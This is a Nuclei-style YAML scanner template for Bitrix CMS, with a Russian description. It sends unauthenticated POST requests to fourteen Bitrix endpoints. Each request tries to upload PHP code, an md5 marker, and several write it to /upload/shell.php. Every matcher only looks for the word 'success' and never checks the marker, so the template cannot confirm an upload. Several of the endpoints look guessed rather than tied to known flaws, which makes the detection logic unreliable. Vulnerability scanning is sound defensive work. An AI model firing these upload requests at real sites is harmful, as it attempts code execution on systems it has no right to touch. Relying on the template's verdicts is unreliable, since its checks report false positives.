id: bitrix-upload-vulnerabilities

info:
  name: Bitrix File Upload Vulnerabilities
  author: clevergod
  severity: critical
  description: |
    Проверка уязвимостей загрузки файлов в Bitrix CMS через различные эндпоинты
  tags: bitrix,file-upload,upload,rce,critical

requests:
  # File Upload через html_editor_action.php
  - method: POST
    path:
      - "{{BaseURL}}/bitrix/tools/html_editor_action.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      sessid=123456789&action=save_file&path=/upload/shell.php&content=<?php echo md5(123456789); ?>
    matchers:
      - type: word
        name: upload-html-editor
        words:
          - "success"

  # File Upload через WebDAV
  - method: POST
    path:
      - "{{BaseURL}}/bitrix/webdav.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      action=upload&path=/upload/shell.php&content=<?php echo md5(123456789); ?>
    matchers:
      - type: word
        name: upload-webdav
        words:
          - "success"

  # File Upload через компонент vote
  - method: POST
    path:
      - "{{BaseURL}}/bitrix/components/bitrix/vote.result.new/ajax.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      VOTE_ID=1&action=upload&file=<?php echo md5(123456789); ?>
    matchers:
      - type: word
        name: upload-vote
        words:
          - "success"

  # File Upload через компонент forum
  - method: POST
    path:
      - "{{BaseURL}}/bitrix/components/bitrix/forum.topic.list/ajax.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      FID=1&action=upload&file=<?php echo md5(123456789); ?>
    matchers:
      - type: word
        name: upload-forum
        words:
          - "success"

  # File Upload через компонент blog
  - method: POST
    path:
      - "{{BaseURL}}/bitrix/components/bitrix/blog.post.list/ajax.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      BLOG_ID=1&action=upload&file=<?php echo md5(123456789); ?>
    matchers:
      - type: word
        name: upload-blog
        words:
          - "success"

  # File Upload через компонент catalog
  - method: POST
    path:
      - "{{BaseURL}}/bitrix/components/bitrix/catalog.section.list/ajax.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      IBLOCK_ID=1&action=upload&file=<?php echo md5(123456789); ?>
    matchers:
      - type: word
        name: upload-catalog
        words:
          - "success"

  # File Upload через компонент sale
  - method: POST
    path:
      - "{{BaseURL}}/bitrix/components/bitrix/sale.basket.basket/ajax.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      PRODUCT_ID=1&action=upload&file=<?php echo md5(123456789); ?>
    matchers:
      - type: word
        name: upload-sale
        words:
          - "success"

  # File Upload через updater
  - method: POST
    path:
      - "{{BaseURL}}/bitrix/modules/updater.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      action=upload&file=<?php echo md5(123456789); ?>
    matchers:
      - type: word
        name: upload-updater
        words:
          - "success"

  # File Upload через composite_data
  - method: POST
    path:
      - "{{BaseURL}}/bitrix/tools/composite_data.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      action=upload&file=<?php echo md5(123456789); ?>
    matchers:
      - type: word
        name: upload-composite
        words:
          - "success"

  # File Upload через site_checker
  - method: POST
    path:
      - "{{BaseURL}}/bitrix/tools/site_checker.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      action=upload&file=<?php echo md5(123456789); ?>
    matchers:
      - type: word
        name: upload-site-checker
        words:
          - "success"

  # File Upload через virtual_file_system
  - method: POST
    path:
      - "{{BaseURL}}/bitrix/tools/virtual_file_system.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      action=upload&path=/upload/shell.php&content=<?php echo md5(123456789); ?>
    matchers:
      - type: word
        name: upload-vfs
        words:
          - "success"

  # File Upload через imagepg.php
  - method: POST
    path:
      - "{{BaseURL}}/bitrix/tools/imagepg.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      action=upload&img=<?php echo md5(123456789); ?>
    matchers:
      - type: word
        name: upload-imagepg
        words:
          - "success"

  # File Upload через ajax_bitrix_sessid_get
  - method: POST
    path:
      - "{{BaseURL}}/bitrix/tools/ajax_bitrix_sessid_get.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      action=upload&file=<?php echo md5(123456789); ?>
    matchers:
      - type: word
        name: upload-sessid
        words:
          - "success"

  # File Upload через calendar_plan_ajax_loader
  - method: POST
    path:
      - "{{BaseURL}}/bitrix/tools/calendar_plan/calendar_plan_ajax_loader.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      action=upload&file=<?php echo md5(123456789); ?>
    matchers:
      - type: word
        name: upload-calendar
        words:
          - "success" 